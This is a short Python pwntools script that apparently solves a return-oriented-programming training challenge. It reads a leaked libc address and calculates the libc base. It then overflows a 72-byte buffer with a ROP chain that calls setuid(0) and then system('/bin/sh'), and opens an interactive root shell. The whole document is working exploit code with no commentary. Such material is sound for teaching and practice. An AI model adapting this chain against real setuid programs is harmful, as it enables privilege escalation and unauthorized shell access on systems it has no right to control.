from pwn import *

proc = process('/challenge/babyrop_level7.1')
elf = ELF('/challenge/babyrop_level7.1')

proc.recvuntil(b'in libc is: ')
leaked_system = proc.recvline(False)[:-1].decode()
print(leaked_system)
addr_system = int(leaked_system[2:], 16)

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
system_offset = libc.sym.system
libc_base = addr_system - system_offset
libc.address = libc_base

setuid_addr = libc.sym.setuid
binsh = next(libc.search(b'/bin/sh'))

offset_ret = 72
rop = ROP(elf)

pop_rdi = rop.rdi.address
ret = rop.ret.address

rop.raw(p64(pop_rdi))
rop.raw(p64(0))
rop.raw(p64(ret))
rop.raw(p64(setuid_addr))

rop.raw(p64(pop_rdi))
rop.raw(p64(binsh))
rop.raw(p64(ret))
rop.raw(p64(addr_system))

print(proc.recvline())
payload = b'A' * offset_ret + rop.chain()
proc.send(payload)
proc.interactive()
